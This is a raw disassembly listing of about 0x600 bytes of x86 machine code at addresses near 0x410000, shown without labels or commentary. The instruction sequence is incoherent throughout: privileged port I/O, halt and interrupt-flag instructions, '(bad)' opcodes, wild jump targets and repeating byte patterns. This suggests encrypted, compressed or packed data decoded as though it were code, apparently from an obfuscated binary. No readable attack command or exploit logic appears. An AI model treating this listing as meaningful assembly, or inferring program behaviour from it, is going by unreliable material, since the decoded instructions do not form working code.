  40ff50:	6f                   	outsl  %ds:(%esi),(%dx)
  40ff51:	98                   	cwtl
  40ff52:	0c b3                	or     $0xb3,%al
  40ff54:	04 ff                	add    $0xff,%al
  40ff56:	96                   	xchg   %eax,%esi
  40ff57:	14 15                	adc    $0x15,%al
  40ff59:	14 b8                	adc    $0xb8,%al
  40ff5b:	82 5e 53 7b          	sbbb   $0x7b,0x53(%esi)
  40ff5f:	32 37                	xor    (%edi),%dh
  40ff61:	59                   	pop    %ecx
  40ff62:	71 7e                	jno    0x40ffe2
  40ff64:	26 a9 d3 6a 21 6f    	es test $0x6f216ad3,%eax
  40ff6a:	5f                   	pop    %edi
  40ff6b:	b2 77                	mov    $0x77,%dl
  40ff6d:	ae                   	scas   %es:(%edi),%al
  40ff6e:	6c                   	insb   (%dx),%es:(%edi)
  40ff6f:	12 39                	adc    (%ecx),%bh
  40ff71:	b3 77                	mov    $0x77,%bl
  40ff73:	b5 8f                	mov    $0x8f,%ch
  40ff75:	6f                   	outsl  %ds:(%esi),(%dx)
  40ff76:	13 b8 24 b8 13 e2    	adc    -0x1dec47dc(%eax),%edi
  40ff7c:	44                   	inc    %esp
  40ff7d:	3d b4 3c b5 22       	cmp    $0x22b53cb4,%eax
  40ff82:	54                   	push   %esp
  40ff83:	55                   	push   %ebp
  40ff84:	dc b9 b3 6f a2 12    	fdivrl 0x12a26fb3(%ecx)
  40ff8a:	35 d2 a2 ab 46       	xor    $0x46aba2d2,%eax
  40ff8f:	c4 bf 25 cc 14 b8    	les    -0x47eb33db(%edi),%edi
  40ff95:	c4 50 d5             	les    -0x2b(%eax),%edx
  40ff98:	69 ee b9 cc 4d ee    	imul   $0xee4dccb9,%esi,%ebp
  40ff9e:	26 6f                	outsl  %es:(%esi),(%dx)
  40ffa0:	25 dc 12 ff 92       	and    $0x92ff12dc,%eax
  40ffa5:	41                   	inc    %ecx
  40ffa6:	77 39                	ja     0x40ffe1
  40ffa8:	b7 c9                	mov    $0xc9,%bh
  40ffaa:	25 33 13 b8 61       	and    $0x61b81333,%eax
  40ffaf:	a2 d3 04 84 67       	mov    %al,0x678404d3
  40ffb4:	44                   	inc    %esp
  40ffb5:	de 25 d3 fa b8 73    	fisubs 0x73b8fad3
  40ffbb:	23 41 72             	and    0x72(%ecx),%eax
  40ffbe:	12 12                	adc    (%edx),%dl
  40ffc0:	35 bc 4f cf 50       	xor    $0x50cf4fbc,%eax
  40ffc5:	ff 86 e0 3d 89 14    	incl   0x14893de0(%esi)
  40ffcb:	b8 8a de fb 05       	mov    $0x5fbde8a,%eax
  40ffd0:	c9                   	leave
  40ffd1:	dc 24 b2             	fsubl  (%edx,%esi,4)
  40ffd4:	5e                   	pop    %esi
  40ffd5:	26 6f                	outsl  %es:(%esi),(%dx)
  40ffd7:	24 bd                	and    $0xbd,%al
  40ffd9:	73 23                	jae    0x40fffe
  40ffdb:	bf 4c 12 39 2b       	mov    $0x2b39124c,%edi
  40ffe0:	31 54 b7 ec          	xor    %edx,-0x14(%edi,%esi,4)
  40ffe4:	99                   	cltd
  40ffe5:	3b e3                	cmp    %ebx,%esp
  40ffe7:	bf 13 b8 db c4       	mov    $0xc4dbb813,%edi
  40ffec:	67 d8 da             	addr16 fcomp %st(2)
  40ffef:	94                   	xchg   %eax,%esp
  40fff0:	22 35 de b9 0e 38    	and    0x380eb9de,%dh
  40fff6:	d3 fe                	sar    %cl,%esi
  40fff8:	4d                   	dec    %ebp
  40fff9:	82 12 35             	adcb   $0x35,(%edx)
  40fffc:	d0 76 5f             	shlb   $1,0x5f(%esi)
  40ffff:	82 84 e0 5f 12 15 13 	addb   $0xb8,0x1315125f(%eax,%eiz,8)
  410006:	b8 
  410007:	d4 a0                	aam    $0xa0
  410009:	07                   	pop    %es
  41000a:	6d                   	insl   (%dx),%es:(%edi)
  41000b:	ee                   	out    %al,(%dx)
  41000c:	84 64 ee cb          	test   %ah,-0x35(%esi,%ebp,8)
  410010:	22 35 15 b8 12 bf    	and    0xbf12b815,%dh
  410016:	60                   	pusha
  410017:	b8 77 35 2b 5f       	mov    $0x5f2b3577,%eax
  41001c:	e9 8c c1 da 14       	jmp    0x151bc1ad
  410021:	b8 e6 84 c7 24       	mov    $0x24c784e6,%eax
  410026:	d4 92                	aam    $0x92
  410028:	e3 f4                	jecxz  0x41001e
  41002a:	04 f8                	add    $0xf8,%al
  41002c:	f5                   	cmc
  41002d:	92                   	xchg   %eax,%edx
  41002e:	fd                   	std
  41002f:	ec                   	in     (%dx),%al
  410030:	99                   	cltd
  410031:	e4 f2                	in     $0xf2,%al
  410033:	39 76 c8             	cmp    %esi,-0x38(%esi)
  410036:	fc                   	cld
  410037:	d4 6f                	aam    $0x6f
  410039:	b2 de                	mov    $0xde,%dl
  41003b:	60                   	pusha
  41003c:	ff 13                	call   *(%ebx)
  41003e:	b8 a7 a8 cc a5       	mov    $0xa5cca8a7,%eax
  410043:	3a 35 22 8a 3b d7    	cmp    0xd73b8a22,%dh
  410049:	70 23                	jo     0x41006e
  41004b:	24 bb                	and    $0xbb,%al
  41004d:	28 12                	sub    %dl,(%edx)
  41004f:	6f                   	outsl  %ds:(%esi),(%dx)
  410050:	a3 16 05 dc d9       	mov    %eax,0xd9dc0516
  410055:	7f c9                	jg     0x410020
  410057:	13 13                	adc    (%ebx),%edx
  410059:	b8 bc b5 31 b7       	mov    $0xb731b5bc,%eax
  41005e:	db 70 22             	(bad) 0x22(%eax)
  410061:	bd 73 df c9 a5       	mov    $0xa5c9df73,%ebp
  410066:	d3 fd                	sar    %cl,%ebp
  410068:	35 5e 12 35 c6       	xor    $0xc635125e,%eax
  41006d:	b1 59                	mov    $0x59,%cl
  41006f:	96                   	xchg   %eax,%esi
  410070:	27                   	daa
  410071:	41                   	inc    %ecx
  410072:	ff 92 6b 13 b8 69    	call   *0x69b8136b(%edx)
  410078:	96                   	xchg   %eax,%esi
  410079:	08 5b a6             	or     %bl,-0x5a(%ebx)
  41007c:	9d                   	popf
  41007d:	7b 2e                	jnp    0x4100ad
  41007f:	73 22                	jae    0x4100a3
  410081:	35 c1 94 12 35       	xor    $0x351294c1,%eax
  410086:	2c 9d                	sub    $0x9d,%al
  410088:	fd                   	std
  410089:	97                   	xchg   %eax,%edi
  41008a:	e4 0f                	in     $0xf,%al
  41008c:	cd cb                	int    $0xcb
  41008e:	13 b8 66 e6 7f d3    	adc    -0x2c80199a(%eax),%edi
  410094:	6b dc 9d             	imul   $0xffffff9d,%esp,%ebx
  410097:	7b b8                	jnp    0x410051
  410099:	cc                   	int3
  41009a:	22 35 41 ed ca 12    	and    0x12caed41,%dh
  4100a0:	35 b8 f0 2f 59       	xor    $0x592ff0b8,%eax
  4100a5:	c1 06 cb             	roll   $0xcb,(%esi)
  4100a8:	9b                   	fwait
  4100a9:	13 b8 b0 98 68 1e    	adc    0x1e6898b0(%eax),%edi
  4100af:	82 e1 19             	and    $0x19,%cl
  4100b2:	4d                   	dec    %ebp
  4100b3:	12 d5                	adc    %ch,%dl
  4100b5:	2b 0d a5 fe e1 9d    	sub    0x9de1fea5,%ecx
  4100bb:	eb 0a                	jmp    0x4100c7
  4100bd:	9b                   	fwait
  4100be:	00 12                	add    %dl,(%edx)
  4100c0:	35 af 64 09 fe       	xor    $0xfe0964af,%eax
  4100c5:	b3 3b                	mov    $0x3b,%bl
  4100c7:	0b fe                	or     %esi,%edi
  4100c9:	25 13 b8 0a 1d       	and    $0x1d0ab813,%eax
  4100ce:	3d a3 48 22 ef       	cmp    $0xef2248a3,%eax
  4100d3:	dc 73 99             	fdivl  -0x67(%ebx)
  4100d6:	6b 55 36 12          	imul   $0x12,0x36(%ebp),%edx
  4100da:	35 92 75 2c 17       	xor    $0x172c7592,%eax
  4100df:	12 c4                	adc    %ah,%al
  4100e1:	bf 64 a1 13 b8       	mov    $0xb813a164,%edi
  4100e6:	e6 89                	out    %al,$0x89
  4100e8:	7c ce                	jl     0x4100b8
  4100ea:	06                   	push   %es
  4100eb:	94                   	xchg   %eax,%esp
  4100ec:	0c 77                	or     $0x77,%al
  4100ee:	7e 22                	jle    0x410112
  4100f0:	c9                   	leave
  4100f1:	e3 8c                	jecxz  0x41007f
  4100f3:	8a 3b                	mov    (%ebx),%bh
  4100f5:	37                   	aaa
  4100f6:	6c                   	insb   (%dx),%es:(%edi)
  4100f7:	12 35 96 b3 1e e8    	adc    0xe81eb396,%dh
  4100fd:	cc                   	int3
  4100fe:	9d                   	popf
  4100ff:	fd                   	std
  410100:	97                   	xchg   %eax,%edi
  410101:	13 b8 a3 d8 91 4c    	adc    0x4c91d8a3(%eax),%edi
  410107:	d7                   	xlat   %ds:(%ebx)
  410108:	b4 22                	mov    $0x22,%ah
  41010a:	35 bd 73 5f 9d       	xor    $0x9d5f73bd,%eax
  41010f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  410110:	48                   	dec    %eax
  410111:	57                   	push   %edi
  410112:	a2 12 35 fe a4       	mov    %al,0xa4fe3512
  410117:	52                   	push   %edx
  410118:	55                   	push   %ebp
  410119:	9d                   	popf
  41011a:	40                   	inc    %eax
  41011b:	ff 92 a1 13 b8 55    	call   *0x55b813a1(%edx)
  410121:	28 f0                	sub    %dh,%al
  410123:	1c ea                	sbb    $0xea,%al
  410125:	9d                   	popf
  410126:	1b 99 cc 22 35 a5    	sbb    -0x5acadd34(%ecx),%ebx
  41012c:	d8 12                	fcoms  (%edx)
  41012e:	35 cd 29 f8 97       	xor    $0x97f829cd,%eax
  410133:	e4 c3                	in     $0xc3,%al
  410135:	d3 bc 13 b8 54 b3 32 	sarl   %cl,0x32b354b8(%ebx,%edx,1)
  41013c:	53                   	push   %ebx
  41013d:	ee                   	out    %al,(%dx)
  41013e:	2c 20                	sub    $0x20,%al
  410140:	3c 20                	cmp    $0x20,%al
  410142:	d6                   	salc
  410143:	0d a1 0e 12 e2       	or     $0xe2120ea1,%eax
  410148:	5f                   	pop    %edi
  410149:	92                   	xchg   %eax,%edx
  41014a:	77 35                	ja     0x410181
  41014c:	08 fd                	or     %bh,%ch
  41014e:	1f                   	pop    %ds
  41014f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  410150:	13 b8 a4 90 f3 fd    	adc    -0x20c6f5c(%eax),%edi
  410156:	93                   	xchg   %eax,%ebx
  410157:	b9 13 0f 57 22       	mov    $0x22570f13,%ecx
  41015c:	6b fa 63             	imul   $0x63,%edx,%edi
  41015f:	c1 3b 87             	sarl   $0x87,(%ebx)
  410162:	05 44 ff 96 f5       	add    $0xf596ff44,%eax
  410167:	ce                   	into
  410168:	12 35 e7 f5 87 50    	adc    0x5087f5e7,%dh
  41016e:	81 14 b8 fe c1 af 3c 	adcl   $0x3cafc1fe,(%eax,%edi,4)
  410175:	99                   	cltd
  410176:	9b                   	fwait
  410177:	ac                   	lods   %ds:(%esi),%al
  410178:	f4                   	hlt
  410179:	81 90 26 39 d4 7c fa 	adcl   $0x73ba84fa,0x7cd43926(%eax)
  410180:	84 ba 73 
  410183:	5d                   	pop    %ebp
  410184:	d2 7e 12             	sarb   %cl,0x12(%esi)
  410187:	39 8a 82 42 69 3b    	cmp    %ecx,0x3b694282(%edx)
  41018d:	a3 f8 97 13 b8       	mov    %eax,0xb81397f8
  410192:	cc                   	int3
  410193:	b2 8e                	mov    $0x8e,%dl
  410195:	ef                   	out    %eax,(%dx)
  410196:	c6                   	(bad)
  410197:	22 e7                	and    %bh,%ah
  410199:	3a 5e 82             	cmp    -0x7e(%esi),%bl
  41019c:	7d 18                	jge    0x4101b6
  41019e:	1b 8b b4 12 35 ac    	sbb    -0x53caed4c(%ebx),%ecx
  4101a4:	7f 49                	jg     0x4101ef
  4101a6:	78 bc                	js     0x410164
  4101a8:	07                   	pop    %es
  4101a9:	e5 be                	in     $0xbe,%eax
  4101ab:	7d 13                	jge    0x4101c0
  4101ad:	b8 12 f2 1f b7       	mov    $0xb71ff212,%eax
  4101b2:	3b 29                	cmp    (%ecx),%ebp
  4101b4:	99                   	cltd
  4101b5:	1b fd                	sbb    %ebp,%edi
  4101b7:	22 35 31 ea 12 2f    	and    0x2f12ea31,%dh
  4101bd:	48                   	dec    %eax
  4101be:	ee                   	out    %al,(%dx)
  4101bf:	9d                   	popf
  4101c0:	35 8a 10 61 b1       	xor    $0xb161108a,%eax
  4101c5:	f7 31                	divl   (%ecx)
  4101c7:	14 86                	adc    $0x86,%al
  4101c9:	8b 26                	mov    (%esi),%esp
  4101cb:	fb                   	sti
  4101cc:	b8 05 8a e9 f5       	mov    $0xf5e98a05,%eax
  4101d1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4101d2:	36 e1 23             	ss loope 0x4101f8
  4101d5:	77 ae                	ja     0x410185
  4101d7:	23 1e                	and    (%esi),%ebx
  4101d9:	d3 b2 25 24 12 39    	shll   %cl,0x39122425(%edx)
  4101df:	98                   	cwtl
  4101e0:	e9 35 9d f0 5f       	jmp    0x60319f1a
  4101e5:	b2 c6                	mov    $0xc6,%dl
  4101e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4101e8:	13 b8 ff 71 28 11    	adc    0x112871ff(%eax),%edi
  4101ee:	b7 6c                	mov    $0x6c,%bh
  4101f0:	ce                   	into
  4101f1:	3d 9c cc 22 6f       	cmp    $0x6f22cc9c,%eax
  4101f6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4101f7:	3c b7                	cmp    $0xb7,%al
  4101f9:	5a                   	pop    %edx
  4101fa:	12 35 b3 ff 92 f0    	adc    0xf092ffb3,%dh
  410200:	52                   	push   %edx
  410201:	21 ce                	and    %ecx,%esi
  410203:	e8 4b 13 b8 db       	call   0xdbf91553
  410208:	e5 22                	in     $0x22,%eax
  41020a:	ce                   	into
  41020b:	35 6b 82 93 b9       	xor    $0xb993826b,%eax
  410210:	a2 22 35 d3 53       	mov    %al,0x53d33522
  410215:	c7                   	(bad)
  410216:	90                   	nop
  410217:	12 fd                	adc    %ch,%bh
  410219:	97                   	xchg   %eax,%edi
  41021a:	ec                   	in     (%dx),%al
  41021b:	9d                   	popf
  41021c:	35 50 8b ea 0d       	xor    $0xdea8b50,%eax
  410221:	6b 13 b8             	imul   $0xffffffb8,(%ebx),%edx
  410224:	e7 f4                	out    %eax,$0xf4
  410226:	e2 43                	loop   0x41026b
  410228:	01 9a cc 9d 35 d9    	add    %ebx,-0x26ca6234(%edx)
  41022e:	22 35 ea f4 df b2    	and    0xb2dff4ea,%dh
  410234:	77 ee                	ja     0x410224
  410236:	c6                   	(bad)
  410237:	12 35 bd 05 91 b0    	adc    0xb09105bd,%dh
  41023d:	db 14 b8             	fistl  (%eax,%edi,4)
  410240:	30 77 12             	xor    %dh,0x12(%edi)
  410243:	e0 99                	loopne 0x4101de
  410245:	d4 be                	aam    $0xbe
  410247:	9f                   	lahf
  410248:	12 d8                	adc    %al,%bl
  41024a:	1d db bd 73 63       	sbb    $0x6373bddb,%eax
  41024f:	c1 a3 00 12 39 9b c1 	shll   $0xc1,-0x64c6ee00(%ebx)
  410256:	d4 38                	aam    $0x38
  410258:	b9 b3 ff 92 a5       	mov    $0xa592ffb3,%ecx
  41025d:	13 b8 51 9d 07 0d    	adc    0xd079d51(%eax),%edi
  410263:	6f                   	outsl  %ds:(%esi),(%dx)
  410264:	49                   	dec    %ecx
  410265:	22 a2 ee dc 90 6f    	and    0x6f90dcee(%edx),%ah
  41026b:	36 12 35 8c 71 bb 25 	adc    %ss:0x25bb718c,%dh
  410272:	41                   	inc    %ecx
  410273:	7f cb                	jg     0x410240
  410275:	72 14                	jb     0x41028b
  410277:	b8 a4 4c 7b ae       	mov    $0xae7b4ca4,%eax
  41027c:	e1 c9                	loope  0x410247
  41027e:	dc 82 26 39 d3 4b    	faddl  0x4bd33926(%edx)
  410284:	1e                   	push   %ds
  410285:	bb 70 12 bf 64       	mov    $0x64bf1270,%ebx
  41028a:	05 77 39 2b 47       	add    $0x472b3977,%eax
  41028f:	cc                   	int3
  410290:	d3 13                	rcll   %cl,(%ebx)
  410292:	b8 f5 27 73 27       	mov    $0x277327f5,%eax
  410297:	c4 8b da 83 b8 22    	les    0x22b883da(%ebx),%ecx
  41029d:	35 a5 00 92 bd       	xor    $0xbd9200a5,%eax
  4102a2:	73 0f                	jae    0x4102b3
  4102a4:	4b                   	dec    %ebx
  4102a5:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4102a6:	12 35 ff ea 9f 13    	adc    0x139feaff,%dh
  4102ac:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4102ad:	93                   	xchg   %eax,%ebx
  4102ae:	b9 b3 ff 13 b8       	mov    $0xb813ffb3,%ecx
  4102b3:	b8 d9 4b 64 a5       	mov    $0xa5644bd9,%eax
  4102b8:	ee                   	out    %al,(%dx)
  4102b9:	22 35 d3 84 77 ee    	and    0xee7784d3,%dh
  4102bf:	81 df 59 dc 12 35    	sbb    $0x3512dc59,%edi
  4102c5:	bd 1c 46 e6 4b       	mov    $0x4be6461c,%ebp
  4102ca:	c2 41 f8             	ret    $0xf841
  4102cd:	97                   	xchg   %eax,%edi
  4102ce:	13 b8 31 d8 93 4b    	adc    0x4b93d831(%eax),%edi
  4102d4:	24 d9                	and    $0xd9,%al
  4102d6:	11 79 e7             	adc    %edi,-0x19(%ecx)
  4102d9:	be 03 d3 a9 35       	mov    $0x35a9d303,%esi
  4102de:	12 12                	adc    (%edx),%dl
  4102e0:	35 97 27 6d 6a       	xor    $0x6a6d2797,%eax
  4102e5:	4e                   	dec    %esi
  4102e6:	00 fe                	add    %bh,%dh
  4102e8:	25 13 b8 32 d0       	and    $0xd032b813,%eax
  4102ed:	ca 49 5b             	lret   $0x5b49
  4102f0:	c6                   	(bad)
  4102f1:	2a 48 e6             	sub    -0x1a(%eax),%cl
  4102f4:	22 6b 41             	and    0x41(%ebx),%ch
  4102f7:	48                   	dec    %eax
  4102f8:	c3                   	ret
  4102f9:	c0 70 e7 12          	shlb   $0x12,-0x19(%eax)
  4102fd:	35 bd b1 fc 8a       	xor    $0x8afcb1bd,%eax
  410302:	35 9b 04 82 7f       	xor    $0x7f82049b,%eax
  410307:	14 b8                	adc    $0xb8,%al
  410309:	cb                   	lret
  41030a:	da 4a b8             	fimull -0x48(%edx)
  41030d:	94                   	xchg   %eax,%esp
  41030e:	26 ce                	es into
  410310:	35 3d 99 39 d3       	xor    $0xd339993d,%eax
  410315:	43                   	inc    %ebx
  410316:	f7 03 82 12 39 e8    	testl  $0xe8391282,(%ebx)
  41031c:	5f                   	pop    %edi
  41031d:	12 e0                	adc    %al,%ah
  41031f:	33 a4 d3 65 13 b8 6c 	xor    0x6cb81365(%ebx,%edx,8),%esp
  410326:	d2 80 82 64 ee 0c    	rolb   %cl,0xcee6482(%eax)
  41032c:	29 cb                	sub    %ecx,%ebx
  41032e:	22 35 44 77 6e 04    	and    0x46e7744,%dh
  410334:	48                   	dec    %eax
  410335:	b8 12 35 72 fc       	mov    $0xfc723512,%eax
  41033a:	9b                   	fwait
  41033b:	9d                   	popf
  41033c:	8c ff                	mov    %?,%edi
  41033e:	96                   	xchg   %eax,%esi
  41033f:	de 14 b8             	ficoms (%eax,%edi,4)
  410342:	11 f1                	adc    %esi,%ecx
  410344:	05 e2 cd 04 da       	add    $0xda04cde2,%eax
  410349:	fc                   	cld
  41034a:	ec                   	in     (%dx),%al
  41034b:	e1 80                	loope  0x4102cd
  41034d:	df a5 33 4b f2 39    	fbld   0x39f24b33(%ebp)
  410353:	4b                   	dec    %ebx
  410354:	b3 5f                	mov    $0x5f,%bl
  410356:	23 02                	and    (%edx),%eax
  410358:	c0 bf 24 4b 13 b8 26 	sarb   $0x26,-0x47ecb4dc(%edi)
  41035f:	99                   	cltd
  410360:	0c 6e                	or     $0x6e,%al
  410362:	5c                   	pop    %esp
  410363:	c3                   	ret
  410364:	07                   	pop    %es
  410365:	76 3a                	jbe    0x4103a1
  410367:	35 d3 bb 05 b7       	xor    $0xb705bbd3,%eax
  41036c:	28 12                	sub    %dl,(%edx)
  41036e:	f8                   	clc
  41036f:	2f                   	das
  410370:	09 ef                	or     %ebp,%edi
  410372:	6f                   	outsl  %ds:(%esi),(%dx)
  410373:	27                   	daa
  410374:	a8 65                	test   $0x65,%al
  410376:	dd 15 13 b8 2f f5    	fstl   0xf52fb813
  41037c:	17                   	pop    %ss
  41037d:	c6                   	(bad)
  41037e:	ce                   	into
  41037f:	48                   	dec    %eax
  410380:	e6 4e                	out    %al,$0x4e
  410382:	81 71 22 a5 97 5e 0d 	xorl   $0xd5e97a5,0x22(%ecx)
  410389:	c1 75 e7 12          	shll   $0x12,-0x19(%ebp)
  41038d:	35 66 00 be 8e       	xor    $0x8ebe0066,%eax
  410392:	15 c8 dc 64 ff       	adc    $0xff64dcc8,%eax
  410397:	14 b8                	adc    $0xb8,%al
  410399:	ca b1 da             	lret   $0xdab1
  41039c:	b2 a5                	mov    $0xa5,%dl
  41039e:	ab                   	stos   %eax,%es:(%edi)
  41039f:	26 39 20             	cmp    %esp,%es:(%eax)
  4103a2:	b9 77 6e 98 12       	mov    $0x12986e77,%ecx
  4103a7:	39 c3                	cmp    %eax,%ebx
  4103a9:	b2 ba                	mov    $0xba,%dl
  4103ab:	58                   	pop    %eax
  4103ac:	c1 ad 99 9b ec bf 14 	shrl   $0x14,-0x40136467(%ebp)
  4103b3:	b8 96 d0 5f 2c       	mov    $0x2c5fd096,%eax
  4103b8:	39 e4                	cmp    %esp,%esp
  4103ba:	26 39 c5             	es cmp %eax,%ebp
  4103bd:	9d                   	popf
  4103be:	fb                   	sti
  4103bf:	3a d3                	cmp    %bl,%dl
  4103c1:	e9 1d d2 12 39       	jmp    0x3953d5e3
  4103c6:	2e 4e                	cs dec %esi
  4103c8:	08 f7                	or     %dh,%bh
  4103ca:	ec                   	in     (%dx),%al
  4103cb:	bf 64 55 13 b8       	mov    $0xb8135564,%edi
  4103d0:	16                   	push   %ss
  4103d1:	22 a8 8b a9 1a db    	and    -0x24e55675(%eax),%ch
  4103d7:	53                   	push   %ebx
  4103d8:	ce                   	into
  4103d9:	9d                   	popf
  4103da:	31 24 07             	xor    %esp,(%edi,%eax,1)
  4103dd:	61                   	popa
  4103de:	08 12                	or     %dl,(%edx)
  4103e0:	35 f6 5f 92 e0       	xor    $0xe0925ff6,%eax
  4103e5:	f5                   	cmc
  4103e6:	be da cb 13 b8       	mov    $0xb813cbda,%esi
  4103eb:	ec                   	in     (%dx),%al
  4103ec:	ae                   	scas   %es:(%edi),%al
  4103ed:	42                   	inc    %edx
  4103ee:	aa                   	stos   %al,%es:(%edi)
  4103ef:	35 f7 9d 2c 77       	xor    $0x772c9df7,%eax
  4103f4:	50                   	push   %eax
  4103f5:	22 bf d3 7d 6b 3e    	and    0x3e6b7dd3(%edi),%bh
  4103fb:	12 5f b2             	adc    -0x4e(%edi),%bl
  4103fe:	8a 3b                	mov    (%ebx),%bh
  410400:	35 e9 48 81 8d       	xor    $0x8d8148e9,%eax
  410405:	13 b8 ef 32 77 f6    	adc    -0x988cd11(%eax),%edi
  41040b:	fa                   	cli
  41040c:	85 44 94 35          	test   %eax,0x35(%esp,%edx,4)
  410410:	86 22                	xchg   %ah,(%edx)
  410412:	a1 47 35 5f 12       	mov    0x125f3547,%eax
  410417:	de b9 74 12 35 9d    	fidivrs -0x62caed8c(%ecx)
  41041d:	16                   	push   %ss
  41041e:	1c 6b                	sbb    $0x6b,%al
  410420:	4b                   	dec    %ebx
  410421:	13 b8 46 32 77 f6    	adc    -0x988cdba(%eax),%edi
  410427:	52                   	push   %edx
  410428:	8d b3 70 35 bd 22    	lea    0x22bd3570(%ebx),%esi
  41042e:	35 61 2c 88 3b       	xor    $0x3b882c61,%eax
  410433:	77 aa                	ja     0x4103df
  410435:	12 35 82 66 a5 5f    	adc    0x5fa56682,%dh
  41043b:	49                   	dec    %ecx
  41043c:	0a fa                	or     %dl,%bh
  41043e:	b7 14                	mov    $0x14,%bh
  410440:	b8 bb 46 1c 4e       	mov    $0x4e1c46bb,%eax
  410445:	5c                   	pop    %esp
  410446:	c7                   	(bad)
  410447:	93                   	xchg   %eax,%ebx
  410448:	b9 f6 26 39 d3       	mov    $0xd33926f6,%ecx
  41044d:	73 f6                	jae    0x410445
  41044f:	61                   	popa
  410450:	e4 12                	in     $0x12,%al
  410452:	ec                   	in     (%dx),%al
  410453:	bf 64 ef 39 2c       	mov    $0x2c39ef64,%edi
  410458:	35 41 d8 6f 13       	xor    $0x136fd841,%eax
  41045d:	b8 b6 75 aa e0       	mov    $0xe0aa75b6,%eax
  410462:	6f                   	outsl  %ds:(%esi),(%dx)
  410463:	4c                   	dec    %esp
  410464:	82 a3 e2 2c 31 11 e9 	andb   $0xe9,0x11312ce2(%ebx)
  41046b:	a0 3b d7 44 2c       	mov    0x2c44d73b,%al
  410470:	1a 12                	sbb    (%edx),%dl
  410472:	35 36 37 47 77       	xor    $0x77473736,%eax
  410477:	f6 5f 32             	negb   0x32(%edi)
  41047a:	fc                   	cld
  41047b:	13 b8 17 80 66 c1    	adc    -0x3e997fe9(%eax),%edi
  410481:	35 64 22 ee 81       	xor    $0x81ee2264,%eax
  410486:	62 32                	bound  %esi,(%edx)
  410488:	6b b2 a0 50 12 7f 01 	imul   $0x1,0x7f1250a0(%edx),%esi
  41048f:	a9 77 35 7e 69       	test   $0x697e3577,%eax
  410494:	10 58 02             	adc    %bl,0x2(%eax)
  410497:	15 b8 2f 90 c9       	adc    $0xc9902fb8,%eax
  41049c:	dc 61 c0             	fsubl  -0x40(%ecx)
  41049f:	ad                   	lods   %ds:(%esi),%eax
  4104a0:	0c df                	or     $0xdf,%al
  4104a2:	9d                   	popf
  4104a3:	27                   	daa
  4104a4:	3a b2 77 ae e3 d3    	cmp    -0x2c1c5189(%edx),%dh
  4104aa:	50                   	push   %eax
  4104ab:	03 62 8b             	add    -0x75(%edx),%esp
  4104ae:	12 3a                	adc    (%edx),%bh
  4104b0:	19 e5                	sbb    %esp,%ebp
  4104b2:	b7 13                	mov    $0x13,%bh
  4104b4:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4104b5:	3b 81 e0 5f 13 b8    	cmp    -0x47eca020(%ecx),%eax
  4104bb:	82 7e 35 ad          	cmpb   $0xad,0x35(%esi)
  4104bf:	d3 22                	shll   %cl,(%edx)
  4104c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4104c2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4104c3:	22 99 35 ba c1 12    	and    0x12c1ba35(%ecx),%bl
  4104c9:	e2 5f                	loop   0x41052a
  4104cb:	92                   	xchg   %eax,%edx
  4104cc:	77 35                	ja     0x410503
  4104ce:	e2 80                	loop   0x410450
  4104d0:	a1 43 13 b8 bb       	mov    0xbbb81343,%eax
  4104d5:	4a                   	dec    %edx
  4104d6:	0f 98 a3 e0 ac 92 09 	sets   0x992ace0(%ebx)
  4104dd:	93                   	xchg   %eax,%ebx
  4104de:	dc 16                	fcoml  (%esi)
  4104e0:	7d d6                	jge    0x4104b8
  4104e2:	7d d3                	jge    0x4104b7
  4104e4:	94                   	xchg   %eax,%esp
  4104e5:	07                   	pop    %es
  4104e6:	6b f7 35             	imul   $0x35,%edi,%esi
  4104e9:	9c                   	pushf
  4104ea:	ea 1b 2e 36 48 fc 4b 	ljmp   $0x4bfc,$0x48362e1b
  4104f1:	13 b8 7e d5 6c 54    	adc    0x546cd57e(%eax),%edi
  4104f7:	3f                   	aas
  4104f8:	35 9d 1b 01 06       	xor    $0x6011b9d,%eax
  4104fd:	97                   	xchg   %eax,%edi
  4104fe:	2d 12 6b c4 d1       	sub    $0xd1c46b12,%eax
  410503:	bf 64 c0 78 5a       	mov    $0x5a78c064,%edi
  410508:	39 13                	cmp    %edx,(%ebx)
  41050a:	b8 c9 23 e2 51       	mov    $0x51e223c9,%eax
  41050f:	32 dc                	xor    %ah,%bl
  410511:	19 7b 75             	sbb    %edi,0x75(%ebx)
  410514:	22 24 ab             	and    (%ebx,%ebp,4),%ah
  410517:	e8 ce 9d 16 63       	call   0x6357a2ea
  41051c:	12 35 7b eb bf db    	adc    0xdbbfeb7b,%dh
  410522:	dc 09                	fmull  (%ecx)
  410524:	ff 25 13 b8 67 42    	jmp    *0x4267b813
  41052a:	2d e6 48 ac 22       	sub    $0x22ac48e6,%eax
  41052f:	ee                   	out    %al,(%dx)
  410530:	dc 49 c9             	fmull  -0x37(%ecx)
  410533:	d7                   	xlat   %ds:(%ebx)
  410534:	3a 99 12 35 93 2c    	cmp    0x2c933512(%ecx),%bl
  41053a:	e7 08                	out    %eax,$0x8
  41053c:	fe                   	(bad)
  41053d:	2d 89 56 14 b8       	sub    $0xb8145689,%eax
  410542:	46                   	inc    %esi
  410543:	6c                   	insb   (%dx),%es:(%edi)
  410544:	e0 f7                	loopne 0x41053d
  410546:	64 6e                	outsb  %fs:(%esi),(%dx)
  410548:	b2 49                	mov    $0x49,%dl
  41054a:	e5 26                	in     $0x26,%eax
  41054c:	39 d3                	cmp    %edx,%ebx
  41054e:	21 0c db             	and    %ecx,(%ebx,%ebx,8)
  410551:	49                   	dec    %ecx
  410552:	2a ee                	sub    %dh,%ch
  410554:	5c                   	pop    %esp
  410555:	d3 12                	rcll   %cl,(%edx)
  410557:	39 2c a1             	cmp    %ebp,(%ecx,%eiz,4)
  41055a:	2f                   	das
  41055b:	be 1c d4 d9 7f       	mov    $0x7fd9d41c,%esi
  410560:	13 b8 73 8d f0 e1    	adc    -0x1e0f728d(%eax),%edi
  410566:	6f                   	outsl  %ds:(%esi),(%dx)
  410567:	1c 4c                	sbb    $0x4c,%al
  410569:	ee                   	out    %al,(%dx)
  41056a:	a1 e0 10 11 ea       	mov    0xea1110e0,%eax
